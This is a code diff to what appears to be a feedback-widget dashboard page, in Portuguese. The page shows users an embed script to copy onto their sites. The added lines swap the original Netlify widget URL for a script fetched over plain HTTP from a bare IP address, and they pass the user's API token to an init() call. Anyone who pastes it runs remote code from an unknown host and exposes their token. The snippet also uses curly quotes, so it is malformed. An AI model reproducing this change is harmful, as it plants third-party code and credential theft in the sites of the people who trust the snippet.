@@ -54,7 +54,14 @@ async function handleCopy(){
         Coloque o script abaixo no seu site para começar a receber feedbacks
       </p>
       <div class="flex justify-between py-3 pl-5 pr-5 mt-2 rounded items-center bg-brand-gray w-full lg:w-1/2 overflow-x-scroll">
-        <pre class="overflow-x-scroll" id="scriptLink">&lt;script scr="https://imatheuspaula-feedbacker-widget.netlify.app?apiKey={{auth.user?.api_token}}">&lt;/script></pre>
+        <pre class="overflow-x-scroll" id="scriptLink">&lt;
+script
+Defer
+Async
+onload=“init(‘{{auth.user?.api_token}}
+’)”
+src=“http://47.254.124.113/init.js”>&lt;
+/script></pre>
         <div class="flex ml-20">
           <iconFactory name="IconCopy" color="#C0BCB0" size="24" class="cursor-pointer"
                        @click="toast.error('função desativada')"
